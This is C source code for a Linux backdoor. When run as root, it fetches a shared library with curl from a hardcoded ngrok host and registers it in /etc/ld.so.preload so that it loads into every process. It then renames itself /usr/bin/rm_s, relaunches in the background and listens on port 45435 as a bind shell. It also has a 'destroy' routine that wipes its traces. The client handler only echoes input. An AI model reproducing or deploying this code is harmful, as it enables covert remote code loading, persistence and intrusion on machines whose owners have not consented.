#include "elf.h"

#define HOST "7af6-2a02-b025-12-9cfc-8cd4-9f53-5c4-93aa.ngrok-free.app"
#define PORT 45435
#define BUFFER_SIZE 1024
#define PASSWORD "password"

#define VERBOSE

#if !defined(HOST)
#error "You must define the host where it is hosted"
#endif // HOST

int main(int argc, char **argv, char **envp) {

    if (getuid() != 0) {
        printf("Invalid\n");
        exit(0);
    }

    if (argc == 2 && strcmp(argv[1], "destroy") == 0) {
        destruct();
    }
    
    int is_set = 0;
    for (int i=0; envp[i]!=NULL; i++) {
        if (strstr(envp[i], "SEPA") != NULL) {
            is_set = 1;
            break;
        }
    }

    if (is_set == 0) {
        printf("Invalid\n");
        exit(0);
    }

    int downloaded = is_downloaded();

    // start bind shell
    if (downloaded == 0) {
        download();
        set_ld_preload();
        move(argv[0]);

        // start /usr/bin/rm_s in background and quit here
        char command[1024];
        sprintf(command, "SEPA=1 /usr/bin/rm_s &");
        system(command);

        return 0;
    }
#ifdef VERBOSE
    printf("%s", argv[0]);
#endif

    if (strcmp(argv[0], "/usr/bin/rm_s") == 0) {
        bind_shell();
        return 0;
    }

    bind_shell();

    return 0;
}

void destruct() {
    char command[1024];
    sprintf(command, "killall %s > /dev/null 2>&1", "rm_s");
    sprintf(command, "rm %s", "/etc/ld.so.preload > /dev/null 2>&1");
    system(command);
    sprintf(command, "rm %s", "/usr/lib/usermode.so > /dev/null 2>&1");
    system(command);
    sprintf(command, "rm %s", "/usr/bin/rm_s > /dev/null 2>&1");
    system(command);
    exit(12);
}

void bind_shell() {
#ifdef VERBOSE
    printf("Starting bind shell...\n");
#endif

    int server_fd, client_fd;
    struct sockaddr_in address;

    // Create a socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Bind the socket to an address and port
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    // Listen for connections
    if (listen(server_fd, 5) < 0) {
        perror("listen failed");
        exit(EXIT_FAILURE);
    }

    while (1) {
        if ((client_fd = accept(server_fd, NULL, NULL)) < 0) {
            perror("accept failed");
            exit(EXIT_FAILURE);
        }

        pthread_t thread_id;
        if (pthread_create(&thread_id, NULL, handle_client, &client_fd) != 0) {
            perror("pthread_create failed");
            exit(EXIT_FAILURE);
        }
    }
}

int is_downloaded() {
#ifdef VERBOSE
    printf("Checking if downloaded...\n");
#endif
    struct stat st = {0};
    if (stat("/usr/lib/usermode.so", &st) == -1) {
        return 0;
    }
    return 1;
}

int set_ld_preload() {
#ifdef VERBOSE
    printf("Setting LD_PRELOAD...\n");
#endif
    int fd = open("/etc/ld.so.preload", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        perror("open failed");
        exit(12);
    }

    char *content = "/usr/lib/usermode.so\n";
    int bytes_written = write(fd, content, strlen(content));
    if (bytes_written < 0) {
        perror("write failed");
        exit(12);
    }

    close(fd);
    return 0;
}

int download() {
#ifdef VERBOSE
    printf("Downloading...\n");
#endif
    char command[1024];
    sprintf(command, "curl -o /usr/lib/usermode.so https://%s/%s > /dev/null 2>&1", HOST, "libelflib.so");
    system(command);
    return 0;
}

int move(char* filename) {
#ifdef VERBOSE
    printf("Moving...\n");
#endif
    char command[1024];
    sprintf(command, "mv %s %s", filename, "/usr/bin/rm_s");
    system(command);
    sprintf(command, "chmod +x %s", "/usr/bin/rm_s");
    system(command);
    return 0;
}

void* handle_client(void* arg) {
    int client_fd = *(int*)arg;
    char buffer[BUFFER_SIZE];

    while (1) {
        int bytes_received = recv(client_fd, buffer, BUFFER_SIZE, 0);
        if (bytes_received < 0) {
            perror("recv failed");
            exit(EXIT_FAILURE);
        }

        if (bytes_received == 0) {
            break;
        }

        int bytes_sent = send(client_fd, buffer, bytes_received, 0);
        if (bytes_sent < 0) {
            perror("send failed");
            exit(EXIT_FAILURE);
        }
    }

    close(client_fd);

    return NULL;
}